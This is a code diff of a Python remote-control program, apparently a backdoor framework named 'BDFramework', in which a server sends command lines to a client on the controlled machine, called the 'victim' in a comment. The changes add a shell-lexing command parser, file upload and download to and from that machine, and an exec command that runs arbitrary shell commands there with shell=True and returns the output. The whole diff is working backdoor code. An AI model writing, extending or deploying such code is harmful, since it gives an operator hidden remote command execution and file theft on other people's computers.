@@ -5,8 +5,10 @@
 """
 import os
 import base64
+import shlex
 import BDProtocol
 import BDFramework
+import subprocess
 
 """"
 	@class ClientMain
@@ -29,11 +31,32 @@ class ClientMain:
 				self.cmdModules.append(module)
 
 
-	def runCMD(self, cmd:list):
+	def runCMD(self, cmdline:str):
+
+		cmd = []
+
+		if not cmdline:
+			return "INVALID_ARGUMENT"
+
+		try:
+
+			print("M-DEFAULT->CLIENT: Lex is interpreting the command-line ")
+
+			# Interpret cmdline into arguments array
+			cmd = shlex.split(cmdline)
+
+			# If no command was identified
+			if len(cmd) < 1:
+				return "INVALID_ARGUMENT"
+
+		except Exception as exc:
+			# Failed interpreting
+			print("Shell lexer[Syntax error]: {}".format(cmdline))
+			return "SHELL_LEXER_ERROR"
 
 		# If module does not exist execute it on the current system
 		if cmd[0] not in self.cmdModules:
-		   self.handler.send_msg("CMD_NOT_FOUND")
+		   return "CMD_NOT_FOUND"
 
 		# Get the command's function
 		cmdFunction = getattr(self, cmd[0])
@@ -43,25 +66,31 @@ class ClientMain:
 
 	def upload(self, argv):
 
+		print("M-DEFAULT->CLIENT[UPLOAD]: Uploading from %s to %s..." % (argv[1], argv[2]))
+
 		# Receive remote file path to write to
-		filename = self.handler.recv_msg()
+		RFILE = argv[2]
 
 		try:
 
 			# Create file stream for writing
-			targetFile = open(filename, 'wb') 
+			targetFile = open(RFILE, 'wb') 
 			
 			# Receive data from client
 			data = self.handler.recv_msg()
-			
+			print("M-DEFAULT->CLIENT[UPLOAD]: Encoded byte size: {}".format(len(data)))
+
 			# Decode data
 			data = base64.b64decode(data.encode('ascii'))
+			print("M-DEFAULT->CLIENT[UPLOAD]: Decoded byte size: {}".format(len(data)))
 
 			# Write data to file
 			targetFile.write(data)
 
 			# Close file
 			targetFile.close()
+
+			print("M-DEFAULT->CLIENT[UPLOAD]: Upload successful")
 
 		except Exception as exc:
 			return 'CMD_FAIL: {}'.format(exc)
@@ -71,7 +100,7 @@ class ClientMain:
 	def download(self, argv):
 		
 		# Receive remote file path to read from
-		filename = self.handler.recv_msg()
+		filename = argv[1]
 		try:
 
 			# Create file stream for reading
@@ -87,10 +116,12 @@ class ClientMain:
 
 		return 'CMD_SUCCESS'
 
+
 	def exec(self, argv):
-		cmd = self.handler.recv_msg()
 		try:
-			os.system(cmd)
+			print("Running {}",format(argv[1:]))
+			p = subprocess.run(argv[1:], capture_output=True, shell=True)
+			return p.stdout.decode('ascii')
 		except Exception as exc:
 			return 'CMD_FAIL: {}'.format(exc)
 
@@ -111,6 +142,7 @@ class ServerMain:
 			"goodbye": "Usage: Close connection"
 		}
 
+## REGISTRATION FUNCTIONS
 	def registerCMDHelp(self, cmd:str, usage:str):
 		if cmd in self.cmdModules:
 			if cmd not in self.cmdModuleHelp.keys():
@@ -127,7 +159,25 @@ class ServerMain:
 			if module not in self.cmdModules:
 				self.cmdModules.append(module)
 
-	def runCMD(self, cmd):
+## MAIN PARSER FUNCTION
+	def runCMD(self, cmdline):
+
+		if not cmdline:
+			return "INVALID_ARGUMENT"
+
+		cmd = None
+
+		try:
+
+			# Interpret cmdline into arguments array
+			cmd = shlex.split(cmdline)
+		
+		except Exception as exc:
+			# Failed interpreting
+			print("Shell lexer[Syntax error]: {}".format(cmdline))
+
+		if cmd == None:
+			return ""
 
 		# If module does not exist execute it on the current system
 		if cmd[0] not in self.cmdModules:
@@ -140,46 +190,55 @@ class ServerMain:
 		# If its not a build-in function
 		if cmd[0] not in self.buildIns:
 
+			# Check the command's arguments
+			result = cmdFunction(cmd, checkArgs=True)
+		
+			# Validate arguments before reaching client
+			if result == "INVALID_ARGUMENT":
+				return self.help(["help"]+cmd)
+
 			# Notify victim of cmd to be executed
-			self.handler.send_msg(cmd[0])
+			print("Sending CMD {} to client...".format(cmd[0]))
+			self.handler.send_msg(cmdline)
 
-		# Run the command
-		return cmdFunction(cmd)
+		# Running the command
+		result = cmdFunction(cmd, checkArgs=False)
 
-	def upload(self, argv):
+		return result
+
+### BEGIN CMD FUNCTIONS
+
+	def upload(self, argv, checkArgs=False):
 
 		if len(argv) < 3:
 			return 'INVALID_ARGUMENT'
 
-		LFILE = argv[1] # Local file
+		if checkArgs:
+			return "OK"
 
-		RFILE = argv[2] # Remote file
+		LFILE = argv[1] # Local file
 
 		# Open lfile for reading
 		DATA = open(LFILE, 'rb').read()
 
 		# Encode data with base64
 		DATA = base64.b64encode(DATA)
-		
-		# Send rfile name
-		self.handler.send_msg(RFILE)
 
 		# Send rfile data
 		self.handler.send_msg(DATA)
 
 		return self.handler.recv_msg()
 
-	def download(self, argv):
+	def download(self, argv, checkArgs):
 
 		if len(argv) < 3:
 			return 'INVALID_ARGUMENT'
 
+		if checkArgs:
+			return "OK"
+
 		RFILE = argv[1] # Remote file
-
 		LFILE = argv[2] # Local file
-
-		# Send remote file name
-		self.handler.send_msg(RFILE)
 
 		# Receive file data
 		DATA = self.handler.recv_msg()
@@ -193,44 +252,46 @@ class ServerMain:
 		return self.handler.recv_msg()
 
 
-	def exec(self, argv):
-
+	def exec(self, argv, checkArgs=False):
+		
 		if len(argv) < 2:
 			return 'INVALID_ARGUMENT'
 
-		command = argv[1]
+		if checkArgs:
+			return "OK"
 
-		# Run command
-		self.handler.send_msg(command)
-
+		print("M-DEFAULT->SERVER[EXEC]: Waiting for client response")
 		return self.handler.recv_msg()
 		
 
-	def goodbye(self, argv):
+	def goodbye(self, argv, checkArgs=False):
 		self.conn.close()
 		self.conn = None
 
-	def help(self, argv):
-		
-		# If an argument was provided
+	def help(self, argv, checkArgs=False):
+
+
 		if len(argv) > 1:
 
+			page = argv[1]
+
 			# If it is an existing module
-			if argv[1] in self.cmdModules:
+			if page in self.cmdModules and page not in self.buildIns:
 
 				# If a help page exists for the command
-				if argv[1] in self.cmdModuleHelp.keys():
+				if page in self.cmdModuleHelp.keys():
 
 					# Print the usage
-					print(self.cmdModuleHelp[argv[1]])
+					print(self.cmdModuleHelp[page])
 
 				# If no help page is available for this command
 				else:
-					print("{} has no manual page".format(argv[1]))
+					print("{} has no manual page".format(page))
 
 			# If the module does not exist
 			else:
 				print("No such module exists.")
+				return "MODULE_NOT_FOUND"
 
 		# If no arguments were provided
 		else:
@@ -240,3 +301,5 @@ class ServerMain:
 			# Print all modules
 			for module in self.cmdModules:
 				print("-", module,"")
+
+		return "CMD_SUCCESS"
